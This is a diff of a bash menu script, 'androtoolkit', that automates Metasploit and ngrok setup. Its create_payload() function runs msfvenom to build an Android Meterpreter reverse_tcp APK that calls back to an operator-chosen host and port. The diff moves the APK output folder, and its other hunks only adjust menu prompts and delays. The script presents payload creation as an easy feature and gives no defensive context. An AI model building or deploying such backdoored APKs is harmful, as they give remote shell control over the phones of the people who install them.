@@ -105,7 +105,7 @@ create_payload()
  if [ -L $PREFIX/bin/msfvenom ];
  then
 	 echo -e "$cyan Please Wait ..."
-	 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $HOME/payload/$apkname.apk > /dev/null 2>&1
+	 msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $HOME/androtoolkit/payload/$apkname.apk > /dev/null 2>&1
 	echo
 	echo -e "$green Payload Created Successfully in androtoolkit/payload folder"
 	echo -e "$purple:)$reset"
@@ -147,7 +147,7 @@ else
 	echo -e "Ngrok is installed :)"
 	echo
 	echo -e "Plz wait...you are redirecting to main menu$reset"
-	sleep 1
+	sleep 2
 	androtoolkit
 fi
 
@@ -156,11 +156,17 @@ fi
 about()
 {
 	echo -e "$yello It's a tool to provide friendly user interface :) My aim behind this tool is to make things easy like payload creation , metasploit installation and ngrok installation & maybe i can update my tool with some extra features$reset"
+	echo
+	echo -e "$yellow press ENTER"
+	androtoolkit
 }
 
 credits()
 {
 echo -e "$yellow Credit goes to Lokesh @Hax4Us$reset"
+echo
+echo -e "$yellow press ENTER"
+androtoolkit
 }
 
 contact()
